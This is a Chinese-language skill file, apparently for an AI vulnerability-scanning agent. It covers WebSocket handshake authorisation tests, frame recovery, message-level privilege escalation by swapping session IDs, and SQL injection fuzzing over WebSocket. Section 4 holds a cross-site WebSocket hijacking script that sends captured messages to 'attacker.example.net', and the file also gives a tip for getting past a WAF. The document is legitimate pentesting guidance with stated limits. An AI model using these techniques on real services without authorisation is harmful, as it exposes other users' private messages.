---
name: hunt-websocket
description: WebSocket / Socket.IO / SSE 通道挖掘：握手鉴权判定（身份是否随 Cookie 自动带、是否校验 Origin、是否校验 session 参与者）、帧结构还原、消息级越权（改 uid / session_id / room）、CSWSH 跨站劫持、盲注与模糊测试管线。适用于私聊、通知、实时行情、协同编辑等长连接功能
whenToUse: "目标存在 ws:// 或 wss:// 端点、前端出现 new WebSocket / io() / EventSource；或 HTTP 接口只给会话列表、拿不到消息正文时"
role: vuln-scan
enabled: true
---

# WebSocket 通道挖掘

> **首选判据：消息正文在哪条通道上。** 大量业务把「列表」放 HTTP、「内容」放 WS。只打 HTTP 会得到"接口存在但拿不到数据"的假结论。
> 来源：`knowledge-sources/PayloadsAllTheThings/Web Sockets/README.md`；知识库 `kind=payload category=websocket` 3 条。

## 0. 先判断该不该走这条通道

| 信号 | 含义 |
|---|---|
| 前端 JS 出现 `new WebSocket(` / `io(` / `EventSource(` | 有长连接 |
| HTTP 接口返回 `session_list` 但无 `messages` | 正文在 WS |
| Network 面板有 `101 Switching Protocols` | 已确认 |
| `/ws` `/socket` `/socket.io/` `/sockjs/` `/websocket` 路径命中 | 常见默认位 |

```bash
# 从打包产物里掏 WS 端点与消息名
grep -ohE "(wss?://[^\"'\` ]+|/sock[a-z/]*|/ws[a-z/]*)" app.js bundle.js | sort -u
grep -ohE "[\"'](enter|join|subscribe|send_msg|chat|message|room)[_a-zA-Z]*[\"']" app.js | sort -u
```

## 1. 握手鉴权 —— 决定危害等级的唯一问题

握手是普通 HTTP Upgrade，**浏览器会自动带 Cookie**。所以：

| 判据 | 测法 | 含义 |
|---|---|---|
| **Origin 是否校验** | 握手加 `Origin: https://evil.example` | 不校验 → CSWSH 可打 |
| **身份从哪来** | 握手只带 Cookie，不带任何 token 参数 | 身份=Cookie，跨站即可复用 |
| **是否校验会话参与者** | 连上后发 `{"cmd":"enter","session_id":<他人会话>}` | 能进 → 水平越权，**critical** |
| **握手参数是否可换** | `?uid=`/`?token=`/`?room=` 逐个替换 | 换得动 → 身份可伪造 |
| **首帧是否要求鉴权** | 连上不发任何帧，观察是否已推数据 | 直接推 → 无鉴权 |

```bash
# 最小握手（看 101 还是 401/403）
curl -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  -H "Origin: https://evil.example" \
  -H "Cookie: $COOKIE" \
  "https://$TARGET/ws"

# 只要 101 就算握手通过；Origin 回显/无校验 = CSWSH 面成立
```

**判读铁律**：`101` = 通道打开，**不等于有权限**。权限要从首帧响应里读，不要从握手码猜。

## 2. 帧结构还原（零风险，先做）

用 wsrepl 或浏览器 console 抓 3~5 帧，回答四个问题：

```bash
pip install wsrepl
wsrepl -u "wss://$TARGET/ws" -H "Cookie: $COOKIE" -H "Origin: https://$TARGET"
# 交互式；`--verbose` 打印 opcode
```

| 要还原的 | 看什么 |
|---|---|
| 帧格式 | 纯 JSON / JSON+base64 / protobuf / 自定义二进制头 |
| 指令名 | `cmd` / `type` / `action` / `op` 字段的值集合 |
| 会话标识 | `session_id` / `chat_id` / `room_id` / `conversation_id` |
| 身份标识 | 帧里是否明文带 `uid` / `from_uid` / `token` |
| 首帧 | 连接后服务端主动推的第一条（常是 auth 结果或未读数） |

**如果帧里带 `uid` 或 `session_id`，这就是本轮的核心变量。** 记下字段名，进第 3 步。

## 3. 消息级越权（四态矩阵，与 HTTP 同构）

对每个"带标识的指令"打四态，**只读取，不写入**：

| 态 | 发送内容 | 判读 |
|---|---|---|
| A | 自己的 id | 基线，必须有数据 |
| B | **他人的 id**（同租户） | 有数据 = 水平越权 |
| C | 随机 id | 有数据 = 无归属校验；报错 = 有 oracle |
| D | 空 id / null | 有数据 = 默认落到某集合 |

```jsonc
// A
{"cmd":"enter_chat","session_id":"<自己的>"}
// B  ← 决定性
{"cmd":"enter_chat","session_id":"<他人的>"}
// 响应里出现对方的 from_uid / 消息正文 = 打穿
```

**红线**：B/C/D 态只读不写。**不要发 `send_msg` / `like` / `follow` 类指令给他人**——那是写入他人侧数据，性质变了。

## 4. CSWSH（跨站 WebSocket 劫持）

前提：握手不校验 Origin **且** 身份来自 Cookie。PoC 托管在攻击者域：

```html
<script>
  const ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = () => ws.send("HELLO");
  ws.onmessage = (e) => {
    new Image().src = 'https://attacker.example.net/?d=' + encodeURIComponent(e.data);
  };
</script>
```

若握手要求 `Sec-WebSocket-Protocol`，作为 `new WebSocket(url, "proto")` 第二参传入。

**本地自证（不搭外站）**：拉一个不同端口的页面发起握手，看是否 101。同源策略对 WS 不生效，所以跨端口即可证明。

## 5. 盲注与模糊测试

WebSocket 不能直接喂 sqlmap，需要中间层：

```bash
# ws-harness.py 把 WS 包成 HTTP，[FUZZ] 标记注入位
python ws-harness.py -u "ws://$TARGET/authenticate-user" -m ./message.txt
# message.txt: {"auth_user":"x","auth_pass":"[FUZZ]"}
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch --tamper=base64encode
```

| 注入位 | 常见载体 |
|---|---|
| SQL | `session_id` 若被拼进查询 |
| 命令 | 文件预览/转码类指令的文件名参数 |
| 模板 | 消息模板变量 |
| 反序列化 | 二进制帧直接喂 ysoserial 载荷前先确认协议头 |

## 6. 常见误判

| 现象 | 别急着判"有防护" |
|---|---|
| 握手 403 | 可能是 WAF 拦 `Origin` 头，去掉再试 |
| 连上就断 | 可能是要求首帧先 `auth`，先发 `{"cmd":"auth","token":...}` |
| 发消息无回显 | 可能是服务端推给"对端"，用第二个账号看接收侧 |
| 业务码非 0 | **业务码 ≠ 拒绝**。`{"code":1007,"msg":"用户手机号为空"}` 说明已穿过鉴权层进业务逻辑 |

## 纪律

- 握手 + 帧分析 **零风险**，永远先做；越权四态其次
- 他人会话只记**字段名 + 是否非空 + 长度**，不落正文
- CSWSH 只自证到 101 + 收到自己数据为止，不实际外带他人数据
- 发现"列表在 HTTP、正文在 WS"时，**先回头修正之前所有基于 HTTP 的否定结论**
